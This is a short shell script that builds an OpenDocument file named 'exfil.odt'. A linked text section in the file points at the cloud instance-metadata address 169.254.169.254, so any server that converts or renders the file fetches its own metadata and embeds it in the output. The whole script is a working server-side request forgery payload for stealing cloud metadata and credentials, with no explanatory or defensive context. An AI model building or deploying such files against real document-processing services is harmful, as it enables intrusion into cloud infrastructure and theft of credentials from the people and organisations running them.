# ---- target ----
TARGET="http://169.254.169.254/latest/meta-data/"
# ----------------

rm -rf odt exfil.odt && mkdir -p odt/META-INF && cd odt

printf 'application/vnd.oasis.opendocument.text' > mimetype

cat > content.xml <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2">
  <office:body><office:text>
    <text:p>exfil start</text:p>
    <text:section text:name="S1" text:protected="true">
      <text:section-source xlink:href="${TARGET}" text:filter-name="Text"/>
      <text:p>placeholder</text:p>
    </text:section>
    <text:p>exfil end</text:p>
  </office:text></office:body>
</office:document-content>
EOF

cat > META-INF/manifest.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2">
  <manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.text"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
</manifest:manifest>
EOF

zip -X -0 ../exfil.odt mimetype >/dev/null
zip -X -rq ../exfil.odt content.xml META-INF
cd .. && echo "built exfil.odt" && unzip -p exfil.odt content.xml | grep -o 'xlink:href="[^"]*"'
